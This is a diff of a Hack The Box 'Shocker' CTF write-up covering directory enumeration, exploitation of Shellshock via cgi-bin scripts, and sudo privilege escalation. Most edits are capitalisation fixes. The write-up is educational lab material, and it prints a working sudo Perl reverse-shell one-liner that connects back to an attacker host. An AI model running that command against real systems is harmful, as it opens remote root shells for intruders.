@@ -9,7 +9,7 @@ title: "HTB Shocker write-up"
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094035274/c913388e-a8d8-40b3-af52-2428eaa47c3b.png)
 
-directory enumeration on the Apache server is performed via `gobuster`
+Directory enumeration on the Apache server is performed via `gobuster`
 
 > Different wordlists may impact enumeration results
 
@@ -17,7 +17,7 @@ directory enumeration on the Apache server is performed via `gobuster`
 
 > `/cgi-bin` directory was discovered however the directory itself is not accessible (error code 403)
 
-while we get a `403` trying to access `/cgi-bin` we could do a further dirbust to see if subsequent directories can be accessed
+While we get a `403` trying to access `/cgi-bin` we could do a further dirbust to see if subsequent directories can be accessed
 
 > always enumerate harder
 
@@ -27,9 +27,9 @@ while we get a `403` trying to access `/cgi-bin` we could do a further dirbust t
 
 # Exploit
 
-we notice that the Apache server is running an older version during recon phase, also given we find `.sh` shell scripts, we piece together two main keywords "apache" "shell script" to find the [CVE](https://www.exploit-db.com/exploits/34900) "Shellshock"
+We notice that the Apache server is running an older version during recon phase, also given we find `.sh` shell scripts, we piece together two main keywords "apache" "shell script" to find the [CVE](https://www.exploit-db.com/exploits/34900) "Shellshock"
 
-to test whether certain exploits are applicable we can first attempt to test our hypothesis using `nmap` scripts
+To test whether certain exploits are applicable we can first attempt to test our hypothesis using `nmap` scripts
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094289067/9b6d360f-308e-4739-aeeb-98631bf6854f.png)
 
@@ -37,31 +37,33 @@ to test whether certain exploits are applicable we can first attempt to test our
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094298992/86a826fc-8045-42d9-bdc4-1a32413e7009.png)
 
-knowing the server is indeed vulnerable, we can try to run to exploit to gain foothold
+Knowing the server is indeed vulnerable, we can try to run to exploit to gain foothold
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094315245/6b8f3624-178d-43b9-b516-fc9f41fe0576.png)
 
-> some errors were caught and after some "try hardering" it was related to the exploit being written in python2
+> some issues were present due to the exploit being written in python2
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094380361/6aea2aab-9941-4035-b33f-e9a5cabbf052.png)
 
-after successfully configuring the payload, we can access the user flag
+After successfully configuring the payload, we can access the user flag
 
 # Priv Esc
 
-due to the box being an easy one, this process is very much a low-hanging fruit
+This is a easy box so the process is very straight forward
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094436484/b9e595fa-710c-49af-8dc1-45d94c88dcbc.png)
 
-a quick GTFObins tour and we can successfully escalate to root
+A quick GTFObins tour and we can successfully escalate to root
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094449118/924b1f2e-e697-4afa-853b-4455d70e233a.png)
 
 ## Alternative method
 
-```bash
-sudo perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
+<pre>
+  <code class="bash">
+    sudo perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  </code>
+</pre>
 
 > this method spawns a reverse shell on your attacking machine instead
 
@@ -77,7 +79,7 @@ sudo perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getp
         
 * ## HTTP response `Content-Type`
     
-    when accessing discovered scripts change the type to `text/plain` so the browser can display the content of the script. in the case where the browser cannot understand the extension, the content will not be displayed when visiting the site #http\_content-type
+    When accessing discovered scripts change the type to `text/plain` so the browser can display the content of the script. In the case where the browser cannot understand the extension, the content will not be displayed when visiting the site #http\_content-type
     
 * ## HTTP/web-related `nmap` NSE script debugging
     
@@ -94,8 +96,7 @@ sudo perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getp
     
     * `nmap` shellshock scripts fail to list `cmd` response due to [RFC standards](https://www.rfc-editor.org/rfc/rfc9110.html): RFC HTTP response standards consist of `\r\n` delimiter between header and body
         
-        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094558051/75af4457-eead-42bd-b0d7-ceed686d610e.png align="left")
+        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094558051/75af4457-eead-42bd-b0d7-ceed686d610e.png)
         
-        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094567545/d4c2a9c0-35bf-4f2c-b12b-e45f865485a5.png align="left")
-        
+        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1695094567545/d4c2a9c0-35bf-4f2c-b12b-e45f865485a5.png)
         > `echo;` inserts a new line in the response, separating the header from the body (`ls` result) `/bin/ls` is used as `ls` returns negative results (alias/PATH not set)
